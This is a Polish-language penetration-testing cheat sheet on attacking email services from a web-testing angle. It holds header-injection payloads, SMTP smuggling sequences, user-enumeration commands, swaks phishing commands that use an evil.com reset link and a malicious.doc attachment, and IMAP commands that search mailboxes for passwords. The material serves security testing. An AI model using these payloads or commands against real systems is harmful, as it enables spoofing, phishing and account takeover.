# Uslugi email -- SMTP, IMAP, POP w kontekscie pentestow webowych

## Wstep

Uslugi pocztowe sa scisle powiazane z bezpieczenstwem aplikacji webowych:
mechanizmy resetowania hasel, powiadomienia email, formularze kontaktowe --
wszystko to moze zostac wykorzystane przez atakujacego. Ponizszy material
opisuje techniki istotne z perspektywy pentestera webowego.

---

## 1. SMTP -- ataki istotne dla aplikacji webowych

### 1.1 Email Header Injection

Jesli aplikacja webowa wysyla emaile na podstawie danych uzytkownika
(formularz kontaktowy, zaproszenia, powiadomienia), mozliwe jest
wstrzykniecie dodatkowych naglowkow SMTP:

**Wektor ataku:**
```
# W polu "email" formularza kontaktowego:
attacker@evil.com%0ACc:victim@target.com
attacker@evil.com%0ABcc:admin@target.com
attacker@evil.com%0ASubject:Zmieniony temat

# Podwojne URL-encode (jesli aplikacja dekoduje dwukrotnie):
attacker@evil.com%250ACc:victim@target.com
```

**Skutki:**
- Wysylanie emaili do dodatkowych odbiorcow (Cc/Bcc)
- Zmiana tresci/tematu emaila
- Wstrzykniecie zalacznikow
- Wykorzystanie serwera jako open relay

### 1.2 SMTP Smuggling

Roznice w interpretacji protokolu SMTP miedzy serwerami pozwalaja
na "przemycenie" dodatkowych wiadomosci email, omijajac SPF/DKIM/DMARC.

**Zasada dzialania:**
Serwer wychodzacy (A) traktuje niestandardowe zakonczenie DATA jako czesc tresci,
podczas gdy serwer odbierajacy (B) interpretuje je jako koniec wiadomosci
i poczatek nowej sesji SMTP.

**Sekwencje do testowania:**
- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (bare CR na koncu)

**Narzedzia:**
```bash
# Skaner podatnosci
./smtpsmug -s mail.target.com -p 25 -t victim@target.com

# Skaner dla obu stron (inbound/outbound)
python3 smtp_smuggling_scanner.py victim@target.com
```

**Dotkniety software:** Postfix < 3.9, Exim < 4.97.1, Sendmail < 8.18

### 1.3 Omijanie Security Email Gateways (SEG)

Organizacje uzywajace Entra ID / Exchange Online czesto maja wiele zaakceptowanych domen.
Jesli ktoras z nich ma rekord MX wskazujacy bezposrednio na serwer pocztowy (z pominieciem SEG),
mozna dostarczac emaile omijajac bramke bezpieczenstwa.

**Szczegolnie wazne:** Domyslna domena `<tenant>.onmicrosoft.com` -- jej MX zawsze wskazuje
na Exchange Online. Jesli ruch przychodzacy nie jest zablokowany, mozna wysylac na
`user@<tenant>.onmicrosoft.com` i ominac SEG.

### 1.4 Enumeracja uzytkownikow przez SMTP

Komendy VRFY, EXPN, RCPT TO pozwalaja weryfikowac istnienie kont email
-- te same konta czesto sluza do logowania w aplikacjach webowych:

```bash
# VRFY
telnet <IP> 25
HELO test
VRFY admin
# 250 = istnieje, 550 = nie istnieje

# RCPT TO
MAIL FROM:test@test.com
RCPT TO:admin@target.com
# 250 = istnieje, 550 = nie istnieje

# Automatyzacja
smtp-user-enum -M VRFY -U users.txt -t <IP>
nmap --script smtp-enum-users <IP>
```

### 1.5 Open Relay -- phishing w kontekscie pentestowym

Serwer SMTP skonfigurowany jako open relay moze byc wykorzystany
do wysylania emaili phishingowych w ramach testu penetracyjnego:

```bash
# Sprawdzenie open relay
nmap -p25 --script smtp-open-relay <IP> -v

# Wysylanie emaila phishingowego
swaks --to victim@target.com --from admin@target.com \
  --header "Subject: Urgent - Password Reset" \
  --body "Click here: http://evil.com/reset" \
  --server <IP>

# Z zalacznikiem (np. makro w dokumencie)
swaks --to hr@target.com --from ceo@target.com \
  --header "Subject: Resume" --body "Please review" \
  --attach @malicious.doc --server <IP>
```

### 1.6 SPF/DKIM/DMARC -- analiza zabezpieczen przed spoofingiem

```bash
# Sprawdzenie SPF
dig txt target.com | grep spf

# Sprawdzenie DKIM
dig 20120113._domainkey.target.com TXT | grep p=

# Sprawdzenie DMARC
dig _dmarc.target.com txt | grep DMARC

# p=none -> brak ochrony, mozliwy spoofing
# p=quarantine -> wiadomosci trafiaja do spamu
# p=reject -> wiadomosci odrzucane

# Dodatkowe sprawdzenia
dig TXT _mta-sts.target.com +short
dig TXT _smtp._tls.target.com +short
```

### 1.7 Analiza naglowkow email (rekonesans)

Wymuszenie odpowiedzi email od celu (np. formularz kontaktowy, wyslanie na nieistniejacy adres)
pozwala uzyskac z naglowkow:
- Wewnetrzne nazwy serwerow
- Adresy IP infrastruktury
- Informacje o oprogramowaniu antywirusowym (`X-Virus-Scanned`)
- Topologie sieci wewnetrznej

---

## 2. IMAP/POP -- dostep do skrzynek pocztowych

### 2.1 Znaczenie dla pentestow webowych

Dostep do skrzynki pocztowej ofiary pozwala:
- Przechwycic tokeny resetowania hasel
- Odczytac kody 2FA/MFA wyslane emailem
- Uzyskac poufne informacje (hasla, konfiguracje)
- Przejac konta w aplikacjach webowych

### 2.2 Enumeracja i dostep IMAP

```bash
# Banner grabbing
nc -nv <IP> 143
openssl s_client -connect <IP>:993 -quiet

# Logowanie i przegladanie skrzynek
A1 LOGIN username password
A1 LIST "" *
A1 SELECT INBOX
A1 FETCH 1:* (FLAGS)
A1 FETCH 1 body[text]

# Wyszukiwanie hasel w szkicach
curl -k 'imaps://<IP>/Drafts?TEXT password' --user user:pass
```

### 2.3 Dostep POP3

```bash
# Polaczenie
nc -nv <IP> 110
openssl s_client -connect <IP>:995 -crlf -quiet

# Odczyt wiadomosci
USER username
PASS password
LIST
RETR 1
```

**Uwaga:** Jesli `auth_debug_passwords` lub `auth_verbose_passwords` sa ustawione
na `true`, hasla moga byc logowane jawnym tekstem w logach serwera POP.

---

## 3. Kluczowe wnioski dla pentestera webowego

| Wektor | Wplyw na aplikacje webowa |
|--------|--------------------------|
| Email Header Injection | Spam, phishing z zaufanego serwera |
| SMTP Smuggling | Ominiecie SPF/DKIM/DMARC, spoofing |
| SEG bypass | Dostarczanie phishingu bez filtrowania |
| SMTP user enum | Lista kont do password sprayingu |
| Open relay | Wysylanie phishingu z zaufanej IP |
| Dostep IMAP/POP | Przechwycenie tokenow reset, kodow 2FA |
| Slaby DMARC (p=none) | Spoofing domeny celu |
